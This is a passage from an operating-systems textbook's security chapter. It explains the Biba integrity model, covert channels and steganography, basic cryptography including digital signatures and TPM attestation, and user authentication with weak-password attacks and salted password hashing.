To summarize the Bell-LaPadula model in military terms, a lieutenant can ask a private to reveal all he knows and then copy this information into a general’s file without violating security. Now let us put the same model in civilian terms. Imagine a company in which janitors have security level 1, programmers have security level 3, and the president of the company has security level 5. Using Bell-LaPadula, a programmer can query a janitor about the company’s future plans and then overwrite the president’s files that contain corporate strategy. Not all companies might be equally enthusiastic about this model.

The problem with the Bell-LaPadula model is that it was devised to keep secrets, not guarantee the integrity of the data. For the latter, we need precisely the reverse properties (Biba, 1977):

1. The simple integrity property: A process running at security level $k$ can write only objects at its level or lower (no write up).
2. The integrity * property: A process running at security level $k$ can read only objects at its level or higher (no read down).

Together, these properties ensure that the programmer can update the janitor’s files with information acquired from the president, but not vice versa. Of course, some organizations want both the Bell-LaPadula properties and the Biba properties, but these are in direct conflict so they are hard to achieve simultaneously.

### 9.4.2 Covert Channels

All these ideas about formal models and provably secure systems sound great, but do they actually work? In a word: No. Even in a system which has a proper security model underlying it and which has been proven to be secure and is correctly implemented, security leaks can still occur. In this section we discuss how information can still leak out even when it has been rigorously proven that such leakage is mathematically impossible. These ideas are due to Lampson (1973).

Lampson’s model was originally formulated in terms of a single timesharing system, but the same ideas can be adapted to LANs and other multiuser environments, including applications running in the cloud. In the purest form, it involves three processes on some protected machine. The first process, the client, wants some work performed by the second one, the server. The client and the server do not entirely trust each other. For example, the server’s job is to help clients with filling out their tax forms. The clients are worried that the server will secretly record their financial data, for example, maintaining a secret list of who earns how much, and then selling the list. The server is worried that the clients will try to steal the valuable tax program.

The third process is the collaborator, which is conspiring with the server to indeed steal the client’s confidential data. The collaborator and server are typically owned by the same person. These three processes are shown in Fig. 9-12. The object of this exercise is to design a system in which it is impossible for the server process to leak to the collaborator process the information that it has legitimately received from the client process. Lampson called this the confinement problem.

From the system designer’s point of view, the goal is to encapsulate or confine the server in such a way that it cannot pass information to the collaborator. Using a protection-matrix scheme we can easily guarantee that the server cannot communicate with the collaborator by writing a file to which the collaborator has read access. We can probably also ensure that the server cannot communicate with the collaborator using the system’s interprocess communication mechanism.

Unfortunately, more subtle communication channels may also be available. For example, the server can try to communicate a binary bit stream as follows. To send

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-077_395_1080_238_226.jpg)

Figure 9-12. (a) The client, server, and collaborator processes. (b) The encapsulated server can still leak to the collaborator via covert channels.

a 1 bit, it computes as hard as it can for a fixed interval of time. To send a 0 bit, it goes to sleep for the same length of time.

The collaborator can try to detect the bit stream by carefully monitoring its response time. In general, it will get better response when the server is sending a 0 than when the server is sending a 1. This communication channel is known as a covert channel, and is illustrated in Fig. 9-12(b).

Of course, the covert channel is a noisy channel, containing a lot of extraneous information, but information can be reliably sent over a noisy channel by using an error-correcting code (e.g., a Hamming code, or even something more sophisticated). The use of an error-correcting code reduces the already low bandwidth of the covert channel even more, but it still may be enough to leak substantial information. It is fairly obvious that no protection model based on a matrix of objects and domains is going to prevent this kind of leakage.

Modulating the CPU usage is not the only covert channel. The paging rate can also be modulated (many page faults for a 1, no page faults for a 0). In fact, almost any way of degrading system performance in a clocked way is a candidate. If the system provides a way of locking files, then the server can lock some file to indicate a 1, and unlock it to indicate a 0. On some systems, it may be possible for a process to detect the status of a lock even on a file that it cannot access. This covert channel is illustrated in Fig. 9-13, with the file locked or unlocked for some fixed time interval known to both the server and collaborator. In this example, the secret bit stream 11010100 is being transmitted.

Locking and unlocking a prearranged file, $S$, is not an especially noisy channel, but it does require fairly accurate timing unless the bit rate is very low. The reliability and performance can be increased even more using an acknowledgement protocol. This protocol uses two more files, F1 and F2, locked by the server and collaborator, respectively, to keep the two processes synchronized. After the server locks or unlocks $S$, it flips the lock status of $F 1$ to indicate that a bit has been sent. As soon as the collaborator has read out the bit, it flips $F 2$ ’s lock status to tell the server it is ready for another bit and waits until F1 is flipped again to indicate that

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-078_408_1282_266_127.jpg)

Figure 9-13. A covert channel using file locking.

another bit is present in $S$. Since timing is no longer involved, this protocol is fully reliable, even in a busy system, and can proceed as fast as the two processes can get scheduled. To get higher bandwidth, why not use two files per bit time, or make it a byte-wide channel with eight signaling files, $S 0$ through $S 7$ ?

Acquiring and releasing dedicated resources (tape drives, plotters, etc.) can also be used for signaling. The server acquires the resource to send a 1 and releases it to send a 0. In UNIX, the server could create a file to indicate a 1 and remove it to indicate a 0; the collaborator could use the access system call to see if the file exists. This call works even though the collaborator has no permission to use the file. Unfortunately, many other covert channels exist.

Lampson also mentioned a way of leaking information to the (human) owner of the server process. Presumably the server process will be entitled to tell its owner how much work it did on behalf of the client, so the client can be billed. If the actual computing bill is, say, $100 and the client’s income is $53,000, the server could report the bill as $100.53 to its owner.

Just finding all the covert channels, let alone blocking them, is nearly hopeless. In practice, there is little that can be done. Introducing a process that causes page faults at random or otherwise spends its time degrading system performance in order to reduce the bandwidth of the covert channels is not an attractive idea.

## Steganography

A slightly different kind of covert channel can be used to pass secret information between processes, even though a human or automated censor gets to inspect all messages between the processes and veto the suspicious ones. For example, consider a company that manually checks all outgoing email sent by company employees to make sure they are not leaking secrets to accomplices or competitors outside the company. Is there a way for an employee to smuggle substantial volumes of confidential information right out under the censor’s nose? It turns out there is and it is not all that hard to do.

As a case in point, consider Fig. 9-14(a). This photograph, taken by the author in Kenya, contains three zebras contemplating an acacia tree. Fig. 9-14(b) appears to be the same three zebras and acacia tree, but it has an extra added attraction. It contains the complete, unabridged text of five of Shakespeare’s plays embedded in it: Hamlet, King Lear, Macbeth, The Merchant of Venice, and Julius Caesar. Together, these plays total over 700 KB of text.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-079_557_1272_519_132.jpg)

Figure 9-14. (a) Three zebras and a tree. (b) Three zebras, a tree, and the complete text of five plays by William Shakespeare.

How does this covert channel work? The original color image is $1024 \times 768$ pixels. Each pixel consists of three 8-bit numbers, one each for the red, green, and blue intensity of that pixel. The pixel’s color is formed by the linear superposition of the three colors. The encoding method uses the low-order bit of each RGB color value as a covert channel. Thus each pixel has room for 3 bits of secret information, one in the red value, one in the green value, and one in the blue value. With an image of this size, up to $1024 \times 768 \times 3$ bits ( 294,912 bytes) of secret information can be stored in it.

The full text of the five plays and a short notice adds up to 734,891 bytes. This was first compressed to about 274 KB using a standard compression algorithm. The compressed output was then encrypted and inserted into the low-order bits of each color value. As can be seen (or actually, cannot be seen), the existence of the information is completely invisible. It is equally invisible in the large, full-color version of the photo. The eye cannot easily distinguish 7-bit color from 8-bit color. Once the image file has gotten past the censor, the receiver just strips off all the low-order bits, applies the decryption and decompression algorithms, and recovers the original 734,891 bytes. Hiding the existence of information like this is called steganography (from the Greek words for “covered writing”). Steganography is not popular in dictatorships that try to restrict communication among their citizens, but it is popular with people who believe strongly in free speech.

Viewing the two images in black and white with low resolution does not do justice to how powerful the technique is. To get a better feel for how steganography works, one of the authors (AST) has prepared a demonstration for Windows systems, including the full-color image of Fig. 9-14(b) with the five plays embedded in it. The demonstration can be found at the URL www.cs.vu.nl/~ast/ . Click on the covered writing link there under the heading STEGANOGRAPHY DEMO. Then follow the instructions on that page to download the image and the steganography tools needed to extract the plays. It is hard to believe this, but give it a try: seeing is believing.

Another use of steganography is to insert hidden watermarks into images used on Web pages to detect their theft and reuse on other Web pages. If your Web page contains an image with the secret message “Copyright 2014, General Images Corporation” you might have a tough time convincing a judge that you produced the image yourself. Music, movies, and other kinds of material can also be watermarked in this way.

Of course, the fact that watermarks are used like this encourages some people to look for ways to remove them. A scheme that stores information in the loworder bits of each pixel can be defeated by rotating the image 1 degree clockwise, then converting it to a lossy system such as JPEG, then rotating it back by 1 degree. Finally, the image can be reconverted to the original encoding system (e.g., gif, bmp, tif). The lossy JPEG conversion will mess up the low-order bits and the rotations involve massive floating-point calculations, which introduce roundoff errors, also adding noise to the low-order bits. The people putting in the watermarks know this (or should know this), so they put in their copyright information redundantly and use schemes besides just using the low-order bits of the pixels. In turn, this stimulates the attackers to look for better removal techniques. And so it goes.

Steganography can be used to leak information in a covert way, but it is more common that we want to do the opposite: hide the information from the prying eys of attackers, without necessarily hiding the fact that we are hiding it. Like Julius Caesar, we want to ensure that even if our messages or files fall in the wrong hands, the attacker will not be able to detect the secret information. This is the domain of cryptography and the topic of the next section.

### 9.5 BASICS OF CRYPTOGRAPHY

Cryptography plays an important role in security. Many people are familiar with newspaper cryptograms, which are little puzzles in which each letter has been systematically replaced by a different one. These have as much to do with modern cryptography as hot dogs have to do with haute cuisine. In this section we will give a bird’s-eye view of cryptography in the computer era. As mentioned earlier, operating systems use cryptography in many places. For instance, some file systems can encrypt all the data on disk, protocols like IPSec may encrypt and/or sign all
network packets, and most operating systems scramble passwords to prevent attackers from recovering them. Moreover, in Sec. 9.6, we will discuss the role of encryption in another important aspect of security: authentication.

We will look at the basic primitives used by these systems. However, a serious discussion of cryptography is beyond the scope of this book. Many excellent books on computer security discuss the topic at length. The interested reader is referred to these (e.g., Kaufman et al., 2002; and Gollman, 2011). Below we will give a very quick discussion of cryptography for readers not familiar with it at all.

The purpose of cryptography is to take a message or file, called the plaintext, and encrypt it into ciphertext in such a way that only authorized people know how to convert it back to plaintext. For all others, the ciphertext is just an incomprehensible pile of bits. Strange as it may sound to beginners in the area, the encryption and decryption algorithms (functions) should always be public. Trying to keep them secret almost never works and gives the people trying to keep the secrets a false sense of security. In the trade, this tactic is called security by obscurity and is employed only by security amateurs. Oddly enough, the category of amateurs also includes many huge multinational corporations that really should know better.

Instead, the secrecy depends on parameters to the algorithms called keys. If $P$ is the plaintext file, $K_{E}$ is the encryption key, $C$ is the ciphertext, and $E$ is the encryption algorithm (i.e., function), then $C=E\left(P, K_{E}\right)$. This is the definition of encryption. It says that the ciphertext is obtained by using the (known) encryption algorithm, $E$, with the plaintext, $P$, and the (secret) encryption key, $K_{E}$, as parameters. The idea that the algorithms should all be public and the secrecy should reside exclusively in the keys is called Kerckhoffs’ principle, formulated by the 19th century Dutch cryptographer Auguste Kerckoffs. All serious cryptographers subscribe to this idea.

Similarly, $P=D\left(C, K_{D}\right)$ where $D$ is the decryption algorithm and $K_{D}$ is the decryption key. This says that to get the plaintext, $P$, back from the ciphertext, $C$, and the decryption key, $K_{D}$, one runs the algorithm $D$ with $C$ and $K_{D}$ as parameters. The relation between the various pieces is shown in Fig. 9-15.

### 9.5.1 Secret-Key Cryptography

To make this clearer, consider an encryption algorithm in which each letter is replaced by a different letter, for example, all $A$ s are replaced by $Q \mathrm{~s}$, all $B \mathrm{~s}$ are replaced by $W \mathrm{~s}$, all $C \mathrm{~s}$ are replaced by $E \mathrm{~s}$, and so on like this:

| plaintext: | ABCDEFGHI JKLMNOPQRSTUVWXYZ |
| --- | --- |
| ciphertext: | QWERTYU I O PA S D F GH J K L Z X C V B NM |

This general system is called a monoalphabetic substitution, with the key being the 26-letter string corresponding to the full alphabet. The encryption key in this example is QWERTYUIOPASDFGHJKLZXCVBNM. For the key given above, the

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-082_426_1194_264_170.jpg)

Figure 9-15. Relationship between the plaintext and the ciphertext.

plaintext ATTACK would be transformed into the ciphertext QZZQEA. The decryption key tells how to get back from the ciphertext to the plaintext. In this example, the decryption key is KXVMCNOPHQRSZYIJADLEGWBUFT because an A in the ciphertext is a $K$ in the plaintext, a $B$ in the ciphertext is an $X$ in the plaintext, etc.

At first glance this might appear to be a safe system because although the cryptanalyst knows the general system (letter-for-letter substitution), he does not know which of the $26!\approx 4 \times 10^{26}$ possible keys is in use. Nevertheless, given a surprisingly small amount of ciphertext, the cipher can be broken easily. The basic attack takes advantage of the statistical properties of natural languages. In English, for example, $e$ is the most common letter, followed by $t, o, a, n, i$, etc. The most common two-letter combinations, called digrams, are th, in, er, re, and so on. Using this kind of information, breaking the cipher is easy.

Many cryptographic systems, like this one, have the property that given the encryption key it is easy to find the decryption key. Such systems are called secretkey cryptography or symmetric-key cryptography. Although monoalphabetic substitution ciphers are completely worthless, other symmetric key algorithms are known and are relatively secure if the keys are long enough. For serious security, minimally 256-bit keys should be used, giving a search space of $2^{256} \approx 1.2 \times 10^{77}$ keys. Shorter keys may thwart amateurs, but not major governments.

### 9.5.2 Public-Key Cryptography

Secret-key systems are efficient because the amount of computation required to encrypt or decrypt a message is manageable, but they have a big drawback: the sender and receiver must both be in possession of the shared secret key. They may even have to get together physically for one to give it to the other. To get around this problem, public-key cryptography is used (Diffie and Hellman, 1976). This
system has the property that distinct keys are used for encryption and decryption and that given a well-chosen encryption key, it is virtually impossible to discover the corresponding decryption key. Under these circumstances, the encryption key can be made public and only the private decryption key kept secret.

Just to give a feel for public-key cryptography, consider the following two questions:

Question 1: How much is $314159265358979 \times 314159265358979$ ?
Question 2: What is the square root of 3912571506419387090594828508241 ?
Most sixth graders, if given a pencil, paper, and the promise of a really big ice cream sundae for the correct answer, could answer question 1 in an hour or two. Most adults given a pencil, paper, and the promise of a lifetime 50% tax cut could not solve question 2 at all without using a calculator, computer, or other external help. Although squaring and square rooting are inverse operations, they differ enormously in their computational complexity. This kind of asymmetry forms the basis of public-key cryptography. Encryption makes use of the easy operation but decryption without the key requires you to perform the hard operation.

A public-key system called RSA exploits the fact that multiplying really big numbers is much easier for a computer to do than factoring really big numbers, especially when all arithmetic is done using modulo arithmetic and all the numbers involved have hundreds of digits (Rivest et al., 1978). This system is widely used in the cryptographic world. Systems based on discrete logarithms are also used (El Gamal, 1985). The main problem with public-key cryptography is that it is a thousand times slower than symmetric cryptography.

The way public-key cryptography works is that everyone picks a (public key, private key) pair and publishes the public key. The public key is the encryption key; the private key is the decryption key. Usually, the key generation is automated, possibly with a user-selected password fed into the algorithm as a seed. To send a secret message to a user, a correspondent encrypts the message with the receiver’s public key. Since only the receiver has the private key, only the receiver can decrypt the message.

### 9.5.3 One-Way Functions

In various situations that we will see later it is desirable to have some function, $f$, which has the property that given $f$ and its parameter $x$, computing $y=f(x)$ is easy to do, but given only $f(x)$, finding $x$ is computationally infeasible. Such a function typically mangles the bits in complex ways. It might start out by initializing $y$ to $x$. Then it could have a loop that iterates as many times as there are 1 bits in $x$, with each iteration permuting the bits of $y$ in an iteration-dependent way, adding in a different constant on each iteration, and generally mixing the bits up very thoroughly. Such a function is called a cryptographic hash function.

### 9.5.4 Digital Signatures

Frequently it is necessary to sign a document digitally. For example, suppose a bank customer instructs the bank to buy some stock for him by sending the bank an email message. An hour after the order has been sent and executed, the stock crashes. The customer now denies ever having sent the email. The bank can produce the email, of course, but the customer can claim the bank forged it in order to get a commission. How does a judge know who is telling the truth?

Digital signatures make it possible to sign emails and other digital documents in such a way that they cannot be repudiated by the sender later. One common way is to first run the document through a one-way cryptographic hashing algorithm that is very hard to invert. The hashing function typically produces a fixed-length result independent of the original document size. The most popular hashing functions used is SHA-1 (Secure Hash Algorithm), which produces a 20-byte result (NIST, 1995). Newer versions of SHA-1 are SHA-256 and SHA-512, which produce 32-byte and 64-byte results, respectively, but they are less widely used to date.

The next step assumes the use of public-key cryptography as described above. The document owner then applies his private key to the hash to get $D$ (hash). This value, called the signature block, is appended to the document and sent to the receiver, as shown in Fig. 9-16. The application of $D$ to the hash is sometimes referred to as decrypting the hash, but it is not really a decryption because the hash has not been encrypted. It is just a mathematical transformation on the hash.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-084_367_1157_1289_189.jpg)

Figure 9-16. (a) Computing a signature block. (b) What the receiver gets.

When the document and hash arrive, the receiver first computes the hash of the document using SHA-1 or whatever cryptographic hash function has been agreed upon in advance. The receiver then applies the sender’s public key to the signature block to get $E(D($ hash $))$. In effect, it “encrypts” the decrypted hash, canceling it out and getting the hash back. If the computed hash does not match the hash from the signature block, the document, the signature block, or both have been tampered with (or changed by accident). The value of this scheme is that it applies (slow)
public-key cryptography only to a relatively small piece of data, the hash. Note carefully that this method works only if for all $x$

$$
E(D(x))=x
$$

It is not guaranteed a priori that all encryption functions will have this property since all that we originally asked for was that

$$
D(E(x))=x
$$

that is, $E$ is the encryption function and $D$ is the decryption function. To get the signature property in addition, the order of application must not matter, that is, $D$ and $E$ must be commutative functions. Fortunately, the RSA algorithm has this property.

To use this signature scheme, the receiver must know the sender’s public key. Some users publish their public key on their Web page. Others do not because they may be afraid of an intruder breaking in and secretly altering their key. For them, an alternative mechanism is needed to distribute public keys. One common method is for message senders to attach a certificate to the message, which contains the user’s name and public key and is digitally signed by a trusted third party. Once the user has acquired the public key of the trusted third party, he can accept certificates from all senders who use this trusted third party to generate their certificates.

A trusted third party that signs certificates is called a CA (Certification Authority). However, for a user to verify a certificate signed by a CA, the user needs the CA’s public key. Where does that come from and how does the user know it is the real one? To do this in a general way requires a whole scheme for managing public keys, called a PKI (Public Key Infrastructure). For Web browsers, the problem is solved in an ad hoc way: all browsers come preloaded with the public keys of about 40 popular CAs.

Above we have described how public-key cryptography can be used for digital signatures. It is worth mentioning that schemes that do not involve public-key cryptography also exist.

### 9.5.5 Trusted Platform Modules

All cryptography requires keys. If the keys are compromised, all the security based on them is also compromised. Storing the keys securely is thus essential. How does one store keys securely on a system that is not secure?

One proposal that the industry has come up with is a chip called the TPM (Trusted Platform Module), which is a cryptoprocessor with some nonvolatile storage inside it for keys. The TPM can perform cryptographic operations such as encrypting blocks of plaintext or decrypting blocks of ciphertext in main memory. It can also verify digital signatures. When all these operations are done in specialized hardware, they become much faster and are likely to be used more widely.

Many computers already have TPM chips and many more are likely to have them in the future.

TPM is extremely controversial because different parties have different ideas about who will control the TPM and what it will protect from whom. Microsoft has been a big advocate of this concept and has developed a series of technologies to use it, including Palladium, NGSCB, and BitLocker. In its view, the operating system controls the TPM and uses it for instance to encrypt the hard drive. However, it also wants to use the TPM to prevent unauthorized software from being run. “Unauthorized software” might be pirated (i.e., illegally copied) software or just software the operating system does not authorize. If the TPM is involved in the booting process, it might start only operating systems signed by a secret key placed inside the TPM by the manufacturer and disclosed only to selected operating system vendors (e.g., Microsoft). Thus the TPM could be used to limit users’ choices of software to those approved by the computer manufacturer.

The music and movie industries are also very keen on TPM as it could be used to prevent piracy of their content. It could also open up new business models, such as renting songs or movies for a specific period of time by refusing to decrypt them after the expiration date.

One interesting use for TPMs is known as remote attestation. Remote attestation allows an external party to verify that the computer with the TPM runs the software it should be running, and not something that cannot be trusted. The idea is that the attesting party uses the TPM to create “measurements” that consist of hashes of the configuration. For instance, let us assume that the external party trusts nothing on our machine, except the BIOS. If the (external) challenging party were able to verify that we ran a trusted bootloader and not some rogue piece of software, this would be a start. If we could additionally prove that we ran a legitimate kernel on this trustworthy bootloader, even better. And if we could finally show that on this kernel we ran the right version of a legitimate application, the challenging party might be satisfied with respect to our trustworthiness.

Let us first consider what happens on our machine, from the moment it boots. When the (trusted) BIOS starts, it first initializes the TPM and uses it to create a hash of the code in memory after loading the bootloader. The TPM writes the result in a special register, known as a PCR (Platform Configuration Register). PCRs are special because they cannot be overwritten directly-but only “extended.” To extend the PCR, the TPM takes a hash of the combination of the input value and the previous value in the PCR, and stores that in the PCR. Thus, if our bootloader is benign, it will take a measurement (create a hash) for the loaded kernel and extend the PCR that previously contained the measurement for the bootloader itself. Intuitively, we may consider the resulting cryptographic hash in the PCR as a hash chain, which binds the kernel to the bootloader. Now the kernel in turn creates takes a measurement of the application and extends the PCR with that.

Now let us consider what happens when an external party wants to verify that we run the right (trustworthy) software stack and not some arbitrary other code.

First, the challenging party creates an unpredictable value of, for example, 160 bits. This value, known as a nonce, is simply a unique identifier for this verification request. It serves to prevent an attacker from recording the response to one remote attestation request, changing the configuration on the attesting party and then simply replaying the previous response for all subsequent attestation requests. By incorporating a nonce in the protocol, such replays are not possible. When the attesting side receives the attestation request (with the nonce), it uses the TPM to create a signature (with its unique and unforgeable key) for the concatenation of the nonce and the value of the PCR. It then sends back this signature, the nonce, the value of the PCR, and hashes for the bootloader, the kernel, and the application. The challenging party first checks the signature and the nonce. Next, it looks up the three hashes in its database of trusted bootloaders, kernels, and applications. If they are not there, the attestation fails. Otherwise, the challenging party re-creates the combined hash of all three components and compares it to the value of the PCR received from the attesting side. If the values match, the challenging side is sure that the attesting side was started with exactly those three components. The signed result prevents attackers from forging the result, and since we know that the trusted bootloader performs the appropriate measurement of the kernel and the kernel in turn measures the application, no other code configuration could have produced the same hash chain.

TPM has a variety of other uses that we do not have space to get into. Interestingly enough, the one thing TPM does not do is make computers more secure against external attacks. What it really focuses on is using cryptography to prevent users from doing anything not approved directly or indirectly by whoever controls the TPM. If you would like to learn more about this subject, the article on Trusted Computing in the Wikipedia is a good place to start.

### 9.6 AUTHENTICATION

Every secured computer system must require all users to be authenticated at login time. After all, if the operating system cannot be sure who the user is, it cannot know which files and other resources he can access. While authentication may sound like a trivial topic, it is a bit more complicated than you might expect. Read on.

User authentication is one of those things we meant by “ontogeny recapitulates phylogeny” in Sec. 1.5.7. Early mainframes, such as the ENIAC, did not have an operating system, let alone a login procedure. Later mainframe batch and timesharing systems generally did have a login procedure for authenticating jobs and users.

Early minicomputers (e.g., PDP-1 and PDP-8) did not have a login procedure, but with the spread of UNIX on the PDP-11 minicomputer, logging in was again needed. Early personal computers (e.g., Apple II and the original IBM PC) did not
have a login procedure, but more sophisticated personal computer operating systems, such as Linux and Windows 8, do (although foolish users can disable it). Machines on corporate LANs almost always have a login procedure configured so that users cannot bypass it. Finally, many people nowadays (indirectly) log into remote computers to do Internet banking, engage in e-shopping, download music, and other commercial activities. All of these things require authenticated login, so user authentication is once again an important topic.

Having determined that authentication is often important, the next step is to find a good way to achieve it. Most methods of authenticating users when they attempt to log in are based on one of three general principles, namely identifying

1. Something the user knows.
2. Something the user has.
3. Something the user is.

Sometimes two of these are required for additional security. These principles lead to different authentication schemes with different complexities and security properties. In the following sections we will examine each of these in turn.

The most widely used form of authentication is to require the user to type a login name and a password. Password protection is easy to understand and easy to implement. The simplest implementation just keeps a central list of (login-name, password) pairs. The login name typed in is looked up in the list and the typed password is compared to the stored password. If they match, the login is allowed; if they do not match, the login is rejected.

It goes almost without saying that while a password is being typed in, the computer should not display the typed characters, to keep them from prying eyes near the monitor. With Windows, as each character is typed, an asterisk is displayed. With UNIX, nothing at all is displayed while the password is being typed. These schemes have different properties. The Windows scheme may make it easy for absent-minded users to see how many characters they have typed so far, but it also discloses the password length to “eavesdroppers” (for some reason, English has a word for auditory snoopers but not for visual snoopers, other than perhaps Peeping Tom, which does not seem right in this context). From a security perspective, silence is golden.

Another area in which not quite getting it right has serious security implications is illustrated in Fig. 9-17. In Fig. 9-17(a), a successful login is shown, with system output in uppercase and user input in lowercase. In Fig. 9-17(b), a failed attempt by a cracker to log into System $A$ is shown. In Fig. 9-17(c) a failed attempt by a cracker to log into System $B$ is shown.

In Fig. 9-17(b), the system complains as soon as it sees an invalid login name. This is a mistake, as it allows the cracker to keep trying login names until she finds a valid one. In Fig. 9-17(c), the cracker is always asked for a password and gets no

| LOGIN: mitch | LOGIN: carol | LOGIN: carol |
| --- | --- | --- |
| PASSWORD: FooBar!-7 | INVALID LOGIN NAME | PASSWORD: Idunno |
| SUCCESSFUL LOGIN | LOGIN: | INVALID LOGIN LOGIN: |
| (a) | (b) | (c) |

Figure 9-17. (a) A successful login. (b) Login rejected after name is entered. (c) Login rejected after name and password are typed.

feedback about whether the login name itself is valid. All she learns is that the login name plus password combination tried is wrong.

As an aside on login procedures, most notebook computers are configured to require a login name and password to protect their contents in the event they are lost are stolen. While better than nothing, it is not much better than nothing. Anyone who gets hold of the notebook can turn it on and immediately go into the BIOS setup program by hitting DEL or F8 or some other BIOS-specific key (usually displayed on the screen) before the operating system is started. Once there, he can change the boot sequence, telling it to boot from a USB stick before trying the hard disk. The finder then inserts a USB stick containing a complete operating system and boots from it. Once running, the hard disk can be mounted (in UNIX) or accessed as the $D$ : drive (Windows). To prevent this situation, most BIOSes allow the user to password protect the BIOS setup program so that only the owner can change the boot sequence. If you have a notebook computer, stop reading now. Go put a password on your BIOS, then come back.

## Weak Passwords

Often, crackers break in simply by connecting to the target computer (e.g., over the Internet) and trying many (login name, password) combinations until they find one that works. Many people use their name in one form or another as their login name. For Someone named “Ellen Ann Smith,” ellen, smith, ellen_smith, ellen-smith, ellen.smith, esmith, easmith, and eas are all reasonable candidates. Armed with one of those books entitled 4096 Names for Your New Baby, plus a telephone book full of last names, a cracker can easily compile a computerized list of potential login names appropriate to the country being attacked (ellen_smith might work fine in the United States or England, but probably not in Japan).

Of course, guessing the login name is not enough. The password has to be guessed, too. How hard is that? Easier than you think. The classic work on password security was done by Morris and Thompson (1979) on UNIX systems. They compiled a list of likely passwords: first and last names, street names, city names, words from a moderate-sized dictionary (also words spelled backward), license plate numbers, etc. They then compared their list to the system password file to see if there were any matches. Over 86% of all passwords turned up in their list.

Lest anyone think that better-quality users pick better-quality passwords, rest assured that they do not. When in 2012, 6.4 million LinkedIn (hashed) passwords leaked to the Web after a hack, many people had fun analyzing the results. The most popular password was “password”. The second most popular was “123456” (“1234”, “12345”, and “12345678” were also in the top 10). Not exactly uncrackable. In fact, crackers can compile a list of potential login names and a list of potential passwords without much work and run a program to try them on as many computers as they can.

This is similar to what researchers at IOActive did in March 2013. They scanned a long list of home routers and set-top boxes to see if they were vulnerable to the simplest possible attack. Rather than trying out many login names and passwords, as we suggested, they tried only the well-known default login and password installed by the manufacturers. Users are supposed to change these values immediately, but it appears that many do not. The researchers found that hundreds of thousands of such devices are potentially vulnerable. Perhaps even more worrying, the Stuxnet attack on an Iranian nuclear facility made use of the fact that the Siemens computers controlling the centrifuges used a default password-one that had been circulating on the Internet for years.

The growth of the Web has made the problem much worse. Instead of having only one password, many people now have dozens or even hundreds. Since remembering them all is too hard, they tend to choose simple, weak passwords and reuse them on many Websites (Florencio and Herley, 2007; and Taiabul Haque et al.,, 2013).

Does it really matter if passwords are easy to guess? Yes, absolutely. In 1998, the San Jose Mercury News reported that a Berkeley resident, Peter Shipley, had set up several unused computers as war dialers, which dialed all 10,000 telephone numbers belonging to an exchange [e.g., (415) 770-xxxx], usually in random order to thwart telephone companies that frown upon such usage and try to detect it. After making 2.6 million calls, he located 20,000 computers in the Bay Area, 200 of which had no security at all.

The Internet has been a godsend to crackers. It takes all the drudgery out of their work. No more phone numbers to dial (and no more dial tones to wait for). “War dialing” now works like this. A cracker may write a script ping (send a network packet) to a set of IP addresses. If it receives any response at all, the script subsequently tries to set up a TCP connection to all the possible services that may be be running on the machine. As mentioned earlier, this mapping out of what is running on which computer is known as portscanning and instead of writing a script from scratch, the attacker may just as well use specialized tools like nmap that provide a wide range of advanced portscanning techniques. Now that the attacker knows which servers are running on which machine, the next step is to launch the attack. For instance, if the attacker wanted to probe the password protection, he would connect to those services that use this method of authentication, like the telnet server, or even the Web server. We have already seen that default and
otherwise weak password enable attackers to harvest a large number of accounts, sometimes with full administrator rights.

## UNIX Password Security

Some (older) operating systems keep the password file on the disk in unencrypted form, but protected by the usual system protection mechanisms. Having all the passwords in a disk file in unencrypted form is just looking for trouble because all too often many people have access to it. These may include system administrators, machine operators, maintenance personnel, programmers, management, and maybe even some secretaries.

A better solution, used in UNIX systems, works like this. The login program asks the user to type his name and password. The password is immediately “encrypted” by using it as a key to encrypt a fixed block of data. Effectively, a oneway function is being run, with the password as input and a function of the password as output. This process is not really encryption, but it is easier to speak of it as encryption. The login program then reads the password file, which is just a series of ASCII lines, one per user, until it finds the line containing the user’s login name. If the (encrypted) password contained in this line matches the encrypted password just computed, the login is permitted, otherwise it is refused. The advantage of this scheme is that no one, not even the superuser, can look up any users’ passwords because they are not stored in unencrypted form anywhere in the system. For illustration purposes, we assume for now that the encrypted password is stored in the password file itself. Later, we will see, this is no longer the case for modern variants of UNIX.

If the attacker manages to get hold of the encrypted password, the scheme can be attacked, as follows. A cracker first builds a dictionary of likely passwords the way Morris and Thompson did. At leisure, these are encrypted using the known algorithm. It does not matter how long this process takes because it is done in advance of the break-in. Now armed with a list of (password, encrypted password) pairs, the cracker strikes. He reads the (publicly accessible) password file and strips out all the encrypted passwords. These are compared to the encrypted passwords in his list. For every hit, the login name and unencrypted password are now known. A simple shell script can automate this process so it can be carried out in a fraction of a second. A typical run of the script will yield dozens of passwords.

After recognizing the possibility of this attack, Morris and Thompson described a technique that renders the attack almost useless. Their idea is to associate an $n$-bit random number, called the salt, with each password. The random number is changed whenever the password is changed. The random number is stored in the password file in unencrypted form, so that everyone can read it. Instead of just storing the encrypted password in the password file, the password and the random number are first concatenated and then encrypted together. This encrypted result is then stored in the password file, as shown in Fig. 9-18 for a password file with five
users, Bobbie, Tony, Laura, Mark, and Deborah. Each user has one line in the file, with three entries separated by commas: login name, salt, and encrypted password + salt. The notation $e(D o g, 4238)$ represents the result of concatenating Bobbie’s password, Dog, with her randomly assigned salt, 4238, and running it through the encryption function, $e$. It is the result of that encryption that is stored as the third field of Bobbie’s entry.

Bobbie, 4238, e(Dog, 4238)

---

Tony, 2918, e(6%%TaeFF, 2918)

---

Laura, 6902, e(Shakespeare, 6902)

---

Mark, 1694, e(XaB#Bwcz, 1694)

---

Deborah, 1092, e(LordByron,1092)

---

Figure 9-18. The use of salt to defeat precomputation of encrypted passwords.

Now consider the implications for a cracker who wants to build up a list of likely passwords, encrypt them, and save the results in a sorted file, $f$, so that any encrypted password can be looked up easily. If an intruder suspects that Dog might be a password, it is no longer sufficient just to encrypt Dog and put the result in $f$. He has to encrypt $2^{n}$ strings, such as Dog0000, Dog0001, Dog0002, and so forth and enter all of them in $f$. This technique increases the size of $f$ by $2^{n}$. UNIX uses this method with $n=12$.

